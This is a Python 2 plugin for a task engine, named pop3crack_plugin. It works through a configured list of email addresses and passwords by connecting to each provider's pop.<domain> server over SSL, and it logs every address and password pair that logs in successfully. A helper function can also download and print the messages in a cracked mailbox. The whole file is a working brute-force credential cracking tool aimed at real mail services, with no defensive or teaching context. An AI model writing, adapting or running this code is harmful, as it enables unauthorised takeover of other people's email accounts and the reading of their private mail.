# -*- coding: gb2312 -*-
'''
http://stackoverflow.com/questions/1225586/checking-email-with-python
'''
from task import engine_plugin
import poplib, socket, ssl
import email

class POP3_SSL(poplib.POP3_SSL):
    def __init__(self, host, port = poplib.POP3_SSL_PORT, timeout=socket._GLOBAL_DEFAULT_TIMEOUT, keyfile = None, certfile = None):
        self.host = host
        self.port = port
        self.keyfile = keyfile
        self.certfile = certfile
        self.buffer = ""
        msg = "getaddrinfo returns an empty list"
        self.sock = None
        for res in socket.getaddrinfo(self.host, self.port, 0, socket.SOCK_STREAM):
            af, socktype, proto, canonname, sa = res
            try:
                self.sock = socket.socket(af, socktype, proto)
                self.sock.settimeout(timeout)
                self.sock.connect(sa)
            except socket.error, msg:
                if self.sock:
                    self.sock.close()
                self.sock = None
                continue
            break
        if not self.sock:
            raise socket.error, msg
        self.file = self.sock.makefile('rb')
        self.sslobj = ssl.wrap_socket(self.sock, self.keyfile, self.certfile)
        self._debugging = 0
        self.welcome = self._getresp()            

class pop3crack_plugin(engine_plugin):    
    def __init__(self, name):
        engine_plugin.__init__(self, name)
        #self.max_process = 20
        self.mail_list = []
        self.pass_list = []
        
    def post_init(self):
        self.mail_list = self.get_cfg_vaule(None, "email").splitlines()
        self.pass_list = self.get_cfg_vaule(None, "pass").splitlines()
        self.timeout = int(self.get_cfg_vaule(None, "timeout"))
        
    def pop3_recv_mails(self, pop_conn):
        #emailMsgNum, emailSize = pop_conn.stat()    
        #print 'email number is %d and size is %d'%(emailMsgNum, emailSize)    
        
        messages = [pop_conn.retr(i) for i in range(1, len(pop_conn.list()[1]) + 1)]
        messages = ["\n".join(mssg[1]) for mssg in messages]
        
        for msg in messages:
            mail = email.message_from_string(msg)
            #h = email.Header.Header(mail['subject'])
            subject, subcode = email.Header.decode_header(mail['subject'])[0]
            print mail['Date'], unicode(subject, subcode)
            
            # extract email content
            payload = ''
            for part in mail.walk():
                # each part is a either non-multipart, or another multipart message
                # that contains further parts... Message is organized like a tree
                # content_type text/html | text/plain
                
                if not (part.is_multipart() or part.get_param("name")):
                    payload += part.get_payload(decode=True)
                
                '''
                if part.get_content_type() == 'text/plain':
                    payload += part.get_payload(decode=True) # prints the raw text
                else:
                    print part.get_content_type()
                    '''
            print unicode(payload, subcode)
            
        
    def pop3test(self, name, pwd):
        user, server = name.strip().split('@', 1)
        server = 'pop.' + server
        
        try:
            pop_conn = POP3_SSL(server, timeout=self.timeout)
            #pop_conn = poplib.POP3('pop.126.com')
            pop_conn.user(user)
            pop_conn.pass_(pwd)
        except:
            return None
        
        #self.pop3_recv_mails(pop_conn)
        pop_conn.quit()
        return True
        
    def handle_task(self, task_info):        
        index = task_info['work']        
        mail = self.mail_list[index].split()

        if len(mail) > 1:
            pass_list = [mail[1]]
        else:
            pass_list = self.pass_list
            
        mail = mail[0]
        for pwd in pass_list:
            print "\r%s\t%s" % (mail, pwd)
            if self.pop3test(mail, pwd):
                self.log(task_info, "%s\t%s\tSUCESS" % (mail, pwd))
                
def init_plugin(name):
    return pop3crack_plugin(name)

